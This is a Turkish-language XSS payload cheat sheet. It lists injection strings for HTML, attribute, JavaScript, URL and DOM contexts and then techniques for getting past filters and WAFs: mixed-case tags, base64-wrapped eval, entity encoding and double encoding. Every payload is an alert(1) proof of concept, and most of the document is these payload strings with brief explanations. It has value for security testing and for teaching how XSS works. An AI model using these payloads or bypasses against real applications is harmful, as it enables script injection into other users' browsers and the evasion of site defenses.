# XSS Payloads & Exploitation Guide

Bu doküman, XSS zafiyetlerini tetiklemek için kullanılan yükleri ve bu süreçteki mantık akışını içerir.

## 0. İlk Keşif: Filtre Testi
Herhangi bir payload denemeden önce, uygulamanın karakterleri nasıl işlediğini anlamak için şu karakter dizisi gönderilmelidir:
`' " < > ( ) ; : & % #`

**Analiz:**
- `< >` dönüştürülüyor mu? (Örn: `&lt; &gt;`) -> Eğer öyleyse HTML Tag kullanamazsın.
- `" '` kaçırılıyor mu? (Örn: `\" \'`) -> Eğer öyleyse Attribute/JS içinden çıkamazsın.



## 1. HTML Context Payloads
Bu context'te amaç, HTML Parser'ı "Data State"ten çıkarıp yeni bir tag oluşturmaya zorlamaktır.

* **En Temel (Script Tag):** `<script>alert(1)</script>`
    * *Mantık:* `<` karakteri parser'ı state değişimine zorlar.
* **Event Handler (Script engelliyse):** `<img src=x onerror=alert(1)>`
    * *Mantık:* Mevcut tag içinde bir hata (error) durumu yaratarak JS engine'i tetikler.
* **HTML5 SVG:** `<svg onload=alert(1)>`
    * *Mantık:* Modern tarayıcıların XML tabanlı parsing yeteneğini kullanır.



## 2. Attribute Context Payloads
Burada amaç, içinde bulunduğumuz attribute sınırını (boundary) kırıp dışarı çıkmak veya yeni bir attribute eklemektir.

* **Boundary Kırma ve Tag Açma:** `"><script>alert(1)</script>`
    * *Senaryo:* `<input value="USER_INPUT">` -> `<input value=""><script>alert(1)</script>">`
* **Mevcut Tag İçinde Kalma (Event Injection):** `" onmouseover="alert(1)`
    * *Senaryo:* `<input value="test" onmouseover="alert(1)">`
* **Hidden Input Bypass:** `" type="text" autofocus onfocus="alert(1)`
    * *Not:* Eğer input `type="hidden"` ise, tipini değiştirerek etkileşime açabiliriz.



## 3. JavaScript Context Payloads
Burada amaç, JS string'ini sonlandırıp engine'in yeni bir komut görmesini sağlamaktır.

* **String Sonlandırma:** `'; alert(1); //`
    * *Senaryo:* `var name = 'USER_INPUT';` -> `var name = ''; alert(1); //';`
* **Template Literal Bypass:** `${alert(1)}`
    * *Not:* Eğer veri backtick (`` ` ``) içindeyse JS'in kendi değişken işleme özelliğini kullanırız.
* **Tag Kapatma (En Garanti Yol):** `</script><script>alert(1)</script>`
    * *Mantık:* JS engine içinde olsak bile, HTML parser hala arkada `<` arar. Script tag'ini tamamen kapatıp yenisini açmak en güçlü yöntemdir.




## 4. URL Context Payloads
Burada boundary kırmaktan ziyade, tarayıcının URL'yi nasıl yorumladığını manipüle ederiz.

* **JavaScript Protokolü:** `javascript:alert(1)`
    * *Senaryo:* `<a href="USER_INPUT">` -> `<a href="javascript:alert(1)">`
* **Encoded JavaScript:** `javascript:%61%6c%65%72%74%28%31%29`
    * *Not:* Bazı filtreler "alert" kelimesini arar, URL encoding ile bu aşılabilir.



## 5. DOM Context Payloads
Burada verinin hangi "Sink"e düştüğü önemlidir.

* **innerHTML / document.write Sinks:** Bu sinkler veriyi HTML parser'a geri gönderir. Bu yüzden HTML Context payload'ları burada da çalışır.
    * `img src=x onerror=alert(1)`
* **eval() / setTimeout() Sinks:** Bu sinkler veriyi doğrudan JS engine'e gönderir.
    * `alert(1)` (Burada tag açmaya gerek yoktur, direkt kod çalışır).




## 6. Bypass & Advanced Techniques

Uygulama temel karakterleri ( <, >, " ) filtreliyorsa veya WAF (Web Application Firewall) varsa şu yöntemler denenmelidir:

### A. Case Sensitivity (Büyük/Küçük Harf)
Bazı filtreler sadece küçük harf odaklıdır.
* `<sCrIpT>alert(1)</sCrIpT>`

### B. Obfuscation (Kod Gizleme)
`alert` kelimesi yasaklıysa:
* `confirm(1)`, `prompt(1)` veya `print()`
* `eval(atob('YWxlcnQoMSk='))` (Base64 ile alert(1) çalıştırma)

### C. HTML Entity Encoding
Eğer parser attribute içindeyse, karakterleri entity olarak yazabiliriz:
* `<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">` (alert(1) kelimesinin decimal karşılığı)

### D. Double Encoding
WAF'ı geçmek için karakteri iki kez encode etme:
* `<` -> `%3C` -> `%253C`


  
